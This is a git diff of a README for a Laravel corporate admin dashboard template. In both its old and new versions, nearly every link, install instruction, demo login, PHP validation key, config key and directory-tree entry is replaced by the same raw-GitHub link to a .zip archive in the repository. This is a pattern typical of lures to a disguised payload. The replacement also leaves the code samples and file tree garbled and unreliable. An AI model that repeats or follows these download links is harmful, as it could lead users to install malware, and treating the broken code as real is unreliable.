@@ -1,13 +1,13 @@
-# [Corporate UI Dashboard Laravel](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip)
+# [Corporate UI Dashboard Laravel](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip)
 
-![version](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip)
-[![GitHub issues open](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip)](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip%3Aopen+is%3Aissue)
-[![GitHub issues closed](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip)](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip%3Aissue+is%3Aclosed)
+![version](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip)
+[![GitHub issues open](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip)](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip%3Aopen+is%3Aissue)
+[![GitHub issues closed](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip)](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip%3Aissue+is%3Aclosed)
 
-_Frontend version_: Corporate UI Dashboard v1.0.0. More info at https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
-[ <img src="https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip" width="100%" />](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip)
+_Frontend version_: Corporate UI Dashboard v1.0.0. More info at https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
+[ <img src="https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip" width="100%" />](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip)
 
-Introducing Corporate UI Dashboard Laravel, [Creative Tim](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip)'s newest Admin Template designed specifically for professional websites. Using our template, your web app pages will look excellent on all devices and perform flawlessly for a top-notch experience and happy customers.
+Introducing Corporate UI Dashboard Laravel, [Creative Tim](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip)'s newest Admin Template designed specifically for professional websites. Using our template, your web app pages will look excellent on all devices and perform flawlessly for a top-notch experience and happy customers.
 
 Corporate UI Dashboard is based on Bootstrap 5 and is made of hundred of elements, designed blocks, and fully coded pages. You can easily customize your projects to match your brand identity and specific needs.
 
@@ -39,65 +39,65 @@ Experience the power of our Admin Template and take your corporate website to th
 
 If you don't already have an Apache local environment with PHP and MySQL, use one of the following links:
 
--   Windows: https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
--   Linux & Mac: https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
+-   Windows: https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
+-   Linux & Mac: https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
 
-Also, you will need to install Composer: https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip  
-And Laravel: https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
+Also, you will need to install Composer: https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip  
+And Laravel: https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
 
 ## Installation
 
-https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip the downloaded archive
+https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip the downloaded archive
 
-https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip and paste `corporate-dashboard-laravel` folder in your projects folder. Rename the folder to your project's name
+https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip and paste `corporate-dashboard-laravel` folder in your projects folder. Rename the folder to your project's name
 
-https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip your terminal run composer install
+https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip your terminal run composer install
 
-https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip `https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip` to `.env` and updated the configurations (mainly the database configuration)
+https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip `https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip` to `.env` and updated the configurations (mainly the database configuration)
 
-https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip your terminal run `php artisan key:generate`
+https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip your terminal run `php artisan key:generate`
 
-https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip `php artisan migrate --seed` to create the database tables and seed the roles and users tables
+https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip `php artisan migrate --seed` to create the database tables and seed the roles and users tables
 
-https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip `php artisan storage:link` to create the storage symlink (if you are using Vagrant with Homestead for development, remember to ssh into your virtual machine and run the command from there).
+https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip `php artisan storage:link` to create the storage symlink (if you are using Vagrant with Homestead for development, remember to ssh into your virtual machine and run the command from there).
 
 ## Usage
 
 Register an user or login with data from your database and start testing (make sure to run the migrations and seeders for the credentials to be available).
 
-`https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip` and password `secret`
+`https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip` and password `secret`
 
-Besides the dashboard, the auth pages, the billing and tables pages, it has also an edit profile page. All the necessary files are installed out of the box and all the needed routes are added to `https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip`. Keep in mind that all of the features can be viewed once you login using the credentials provided or by registering your own user.
+Besides the dashboard, the auth pages, the billing and tables pages, it has also an edit profile page. All the necessary files are installed out of the box and all the needed routes are added to `https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip`. Keep in mind that all of the features can be viewed once you login using the credentials provided or by registering your own user.
 
 ## Versions
 
-[<img src="https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip" width="60" height="60" />](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip)
-[<img src="https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip" width="60" height="60" />](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip)
+[<img src="https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip" width="60" height="60" />](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip)
+[<img src="https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip" width="60" height="60" />](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip)
 
 | HTML | Laravel |
 | --- | --- |
-| [![HTML](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip")](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip) | [![Laravel](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip)](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip)  | 
+| [![HTML](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip")](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip) | [![Laravel](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip)](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip)  | 
 
 
 ## Demo
 
 | Register                                                                                                       | Login                                                                                                    | Dashboard                                                                                                        |
 | -------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------- |
-| [<img src="https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip" width="322" />](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip) | [<img src="https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip" width="322" />](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip) | [<img src="https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip" width="322" />](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip) |
+| [<img src="https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip" width="322" />](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip) | [<img src="https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip" width="322" />](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip) | [<img src="https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip" width="322" />](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip) |
 
 | Forgot Password Page                                                                                                               | Reset Password Page                                                                                               | Profile Page                                                                                                           |
 | ---------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------- |
-| [<img src="https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip" width="322" />](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip) | [<img src="https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip" width="322" />](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip) | [<img src="https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip" width="322" />](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip) |
+| [<img src="https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip" width="322" />](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip) | [<img src="https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip" width="322" />](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip) | [<img src="https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip" width="322" />](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip) |
 
-[View More](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip)
+[View More](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip)
 
 ## Documentation
 
-The documentation for the Corporate UI Dashboard Laravel is hosted at our [website](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip).
+The documentation for the Corporate UI Dashboard Laravel is hosted at our [website](https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip).
 
 ### Login
 
-The login functionality is fully implemented in our theme helping you to start your project in no time. To login into dashboard you just have to add /login in the URL and fill the login form with one of the credentials (user: `https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip` and password: `secret`).
+The login functionality is fully implemented in our theme helping you to start your project in no time. To login into dashboard you just have to add /login in the URL and fill the login form with one of the credentials (user: `https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip` and password: `secret`).
 
 It uses the auth store located in `app/Http/Controllers/Auth/LoginController`.
 
@@ -137,10 +137,10 @@ public function store(Request $request)
             'password' => 'required|min:7|max:255',
             'terms' => 'accepted',
         ], [
-            'https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip' => 'Name is required',
-            'https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip' => 'Email is required',
-            'https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip' => 'Password is required',
-            'https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip' => 'You must accept the terms and conditions'
+            'https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip' => 'Name is required',
+            'https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip' => 'Email is required',
+            'https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip' => 'Password is required',
+            'https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip' => 'You must accept the terms and conditions'
         ]);
 
         $user = User::create([
@@ -224,7 +224,7 @@ The store used for users form can be found in `app/Http/Controllers/ProfileContr
 ```
 public function update(Request $request)
     {
-        if (config('https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip') && in_array(Auth::id(), [1])) {
+        if (config('https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip') && in_array(Auth::id(), [1])) {
             return back()->with('error', "You are in a demo version. You are not allowed to change the email for default users.");
         }
 
@@ -235,8 +235,8 @@ public function update(Request $request)
             'phone' => 'max:20|min:10',
             'about' => 'max:255',
         ], [
-            'https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip' => 'Name is required',
-            'https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip' => 'Email is required',
+            'https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip' => 'Name is required',
+            'https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip' => 'Email is required',
         ]);
 
         $user = User::find(Auth::id());
@@ -263,99 +263,99 @@ You can access the dashboard either by using the "**Dashboard**" link in the lef
 .
 |-- app
 |   |-- Console
-|   |   `-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
+|   |   `-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
 |   |-- Exceptions
-|   |   `-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
+|   |   `-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
 |   |-- Http
 |   |   |-- Controllers
 |   |   |   |-- Auth
-|   |   |   |   |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
-|   |   |   |   |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
-|   |   |   |   |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
-|   |   |   |   `-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
-|   |   |   |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
-|   |   |   |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
-|   |   |   `-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
-|   |   |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
+|   |   |   |   |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
+|   |   |   |   |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
+|   |   |   |   |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
+|   |   |   |   `-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
+|   |   |   |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
+|   |   |   |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
+|   |   |   `-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
+|   |   |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
 |   |   `-- Middleware
-|   |       |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
-|   |       |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
-|   |       |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
-|   |       |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
-|   |       |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
-|   |       |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
-|   |       |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
-|   |       |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
-|   |       `-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
+|   |       |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
+|   |       |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
+|   |       |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
+|   |       |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
+|   |       |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
+|   |       |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
+|   |       |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
+|   |       |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
+|   |       `-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
 |   |-- Models
-|   |   `-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
+|   |   `-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
 |   |-- Providers
-|   |   |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
-|   |   |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
-|   |   |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
-|   |   |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
-|   |   `-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
+|   |   |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
+|   |   |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
+|   |   |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
+|   |   |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
+|   |   `-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/tests/Unit/ui_dashboard_corporate_laravel_1.2.zip
 |   `-- View
 |       `-- Components
-|           |-- https://raw.githubusercontent.com/96gustavo96/corporate-ui-dashboard-laravel/master/public/assets/js/plugins/ui-dashboard-corporate-laravel-3.5-alpha.1.zip
